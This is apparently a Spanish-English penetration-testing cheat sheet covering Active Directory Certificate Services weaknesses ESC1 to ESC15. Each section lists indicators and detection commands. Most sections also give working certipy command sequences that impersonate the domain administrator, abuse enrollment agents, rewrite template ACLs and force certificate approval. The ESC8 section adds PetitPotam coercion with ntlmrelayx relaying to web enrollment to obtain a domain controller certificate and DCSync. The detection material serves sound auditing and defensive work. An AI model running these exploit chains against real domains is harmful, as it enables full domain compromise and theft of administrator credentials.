---
aliases:
  - "Active Directory Certificate Services (ESC1)"
  - ESC1 ESC2 ESC3
  - ADCS Vulnerabilities
  - certipy vulnerable
  - ESC chain
tags:
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[AD - ADCS Enumeration]]"
---
# AD - ADCS Enumeration - ESC1-ESC15 Identification

***

## ESC1 (SAN + Client Auth)

| **Indicador** | **Detección** | **Exploit** |
|:---:|:---:|:---:|
| `msPKI-Certificate-Name-Flag` con `ENROLLEE_SUPPLIES_SUBJECT` (0x1) + auth EKU + Authenticated Users enroll | `certipy find -u u -p pass -dc-ip <DC> -vulnerable -stdout \| grep ESC1` | Standard ESC1. |
| `Certify.exe find /vulnerable` (Windows) | Mismo | Standard. |
^ad-esc1

```bash
# Exploit ESC1
certipy req -u atacante@corp.local -p pass -ca <CA-name> \
  -template <vuln-template> -upn 'administrator@corp.local'

# Auth con cert PKINIT
certipy auth -pfx administrator.pfx -dc-ip <DC>
# Output: Administrator NT hash + TGT
```

___

## ESC2 (Any Purpose)

| **Indicador** | **Detección** | **Exploit** |
|:---:|:---:|:---:|
| EKU `Any Purpose` (2.5.29.37.0) o sin EKU + Authenticated Users enroll | `certipy find -vulnerable \| grep ESC2` | Standard. |
^ad-esc2

```bash
# Exploit ESC2
certipy req -u atacante@corp.local -p pass -ca <CA-name> -template <vuln-template>
# Cert con Any Purpose EKU = puede usarse para Client Auth (entre otros)

certipy auth -pfx <cert>.pfx -dc-ip <DC>
```

___

## ESC3 (Enrollment Agent)

| **Indicador** | **Detección** | **Exploit** |
|:---:|:---:|:---:|
| EKU `Certificate Request Agent` (1.3.6.1.4.1.311.20.2.1) + Authenticated Users enroll | `certipy find -vulnerable \| grep ESC3` | Standard. |
^ad-esc3

```bash
# 2-step exploit
# 1. Get Enrollment Agent cert (template ESC3)
certipy req -u atacante@corp.local -p pass -ca <CA-name> -template <ESC3-template>

# 2. Use Enrollment Agent cert para request cert "on behalf of" victim
certipy req -u atacante@corp.local -p pass -ca <CA-name> \
  -template User -on-behalf-of 'corp\administrator' \
  -pfx atacante.pfx

# 3. Auth con cert obtained
certipy auth -pfx administrator.pfx -dc-ip <DC>
```

___

## ESC4 (Vulnerable Template ACL)

| **Indicador** | **Detección** | **Exploit** |
|:---:|:---:|:---:|
| `WriteProperty` / `WriteDacl` / `GenericAll` sobre template object | `certipy find -vulnerable \| grep ESC4` | Modify template flags. |
^ad-esc4

```bash
# Exploit ESC4 — modify template para hacerlo ESC1
# 1. Modify template (set ENROLLEE_SUPPLIES_SUBJECT + Authenticated Users enroll)
certipy template -u atacante@corp.local -p pass -dc-ip <DC> -template <victim-template> -save-old

# 2. Now exploit como ESC1
certipy req -u atacante -p pass -ca <CA-name> -template <victim-template> -upn admin@corp.local

# 3. Cleanup
certipy template -u atacante -p pass -dc-ip <DC> -template <victim-template> -load <saved-config>
```

___

## ESC5 (Vulnerable PKI Object ACL)

| **Indicador** | **Detección** | **Exploit** |
|:---:|:---:|:---:|
| `WriteProperty` / `GenericAll` sobre PKI containers (CA, NTAuthCertificates, etc) | Manual ACL audit | Wide privesc surface. |
| `Find-InterestingDomainAcl -ResolveGUIDs \| ? ObjectDN -match "Public Key Services"` | Hunt | Audit. |
^ad-esc5

___

## ESC6 (EDITF_ATTRIBUTESUBJECTALTNAME2)

| **Indicador** | **Detección** | **Exploit** |
|:---:|:---:|:---:|
| EDITF flag `0x40000` set en CA | `certutil -getreg policy\EditFlags` (en CA host) | `certipy find -vulnerable \| grep ESC6`. |
^ad-esc6

```bash
# Exploit ESC6 — incluso templates "safe" permiten SAN injection
certipy req -u atacante@corp.local -p pass -ca <vuln-CA> \
  -template User -upn 'administrator@corp.local'

# El CA acepta SAN custom incluso si template no permite ENROLLEE_SUPPLIES_SUBJECT
```

___

## ESC7 (Vulnerable CA ACL)

| **Indicador** | **Detección** | **Exploit** |
|:---:|:---:|:---:|
| `ManageCA` o `ManageCertificates` para non-Tier-0 principals | `certipy find -vulnerable \| grep ESC7` | Approve pending requests. |
^ad-esc7

```bash
# Exploit ESC7 — atacante con ManageCA approve cualquier request
# 1. Submit request (template requires approval)
certipy req -u atacante@corp.local -p pass -ca <CA-name> -template <approval-template>

# 2. Approve as ManageCA
certipy ca -u atacante -p pass -ca <CA-name> -issue-request <req-id>

# 3. Retrieve cert
certipy req -u atacante -p pass -ca <CA-name> -retrieve <req-id>
```

___

## ESC8 (Web Enrollment Relay)

| **Indicador** | **Detección** | **Exploit** |
|:---:|:---:|:---:|
| HTTP Web Enrollment endpoint (`/certsrv/`) habilitado sin EPA | `curl -k https://<CA-host>/certsrv/` | NTLM Relay → cert. |
^ad-esc8

```bash
# Exploit ESC8
# 1. Coercer victim auth via NTLM (PetitPotam, PrinterBug, etc)
python3 PetitPotam.py -u u -p pass <attacker-IP> <victim-DC>

# 2. Relay to CA Web Enrollment
ntlmrelayx.py -t http://<CA-host>/certsrv/certfnsh.asp \
  --adcs --template DomainController

# Output: cert para victim DC$ → DCSync via PKINIT
```

___

## ESC9 (No Security Extension)

| **Indicador** | **Detección** | **Exploit** |
|:---:|:---:|:---:|
| Template con `EnrollmentFlag NO_SECURITY_EXTENSION` (0x80000) | `certipy find -vulnerable \| grep ESC9` | Cert sin SID security extension = mapping bypass. |
^ad-esc9

```bash
# ESC9 — Cuando StrongCertificateBindingEnforcement is Compatible mode (post-Certifried)
# atacante con GenericWrite sobre victim modifica UPN del victim antes de auth
certipy account -u atacante -p pass -dc-ip <DC> -upn 'administrator@corp.local' -user <victim>
certipy req -u <victim>@corp.local -p '<victim-pass>' -ca <CA-name> -template <ESC9-template>
certipy auth -pfx victim.pfx -dc-ip <DC>
```

___

## ESC10 (Weak Cert Mappings)

| **Indicador** | **Detección** | **Exploit** |
|:---:|:---:|:---:|
| Registry `StrongCertificateBindingEnforcement = 0` o `1` (Disabled / Compatible) | Local CA host check | Cert mapping bypass. |
| `CertificateMappingMethods = 0x4` (UPN-only mapping) | Registry check | Modern requirement: bit 0x10. |
^ad-esc10

___

## ESC11 (LDAP NO_PROTECTION_POLICY)

| **Indicador** | **Detección** | **Exploit** |
|:---:|:---:|:---:|
| LDAP signing/channel-binding off | `nxc ldap <DC> -u u -p p --signing` | NTLM Relay LDAP-style → cert. |
^ad-esc11

___

## ESC12-ESC15 (Modern)

| **ESC** | **Vector** | **Detección** |
|:---:|:---:|:---:|
| **ESC12** | YubiKey HSM with weak credentials | `certipy find` + manual. |
| **ESC13** | Issuance Policies → group membership grant via OID linked groups | `certipy find -vulnerable -text` (post-2024). |
| **ESC14** | `altSecurityIdentities` weak mappings | Registry + LDAP audit. |
| **ESC15** | Templates con application policies abuse (Schannel client auth) | `certipy find` modern. |
^ad-esc12-15

```bash
# ESC13 — issuance policies linked groups
certipy find -u u -p pass -dc-ip <DC> -text -vulnerable | grep -A5 "ESC13"
```

***
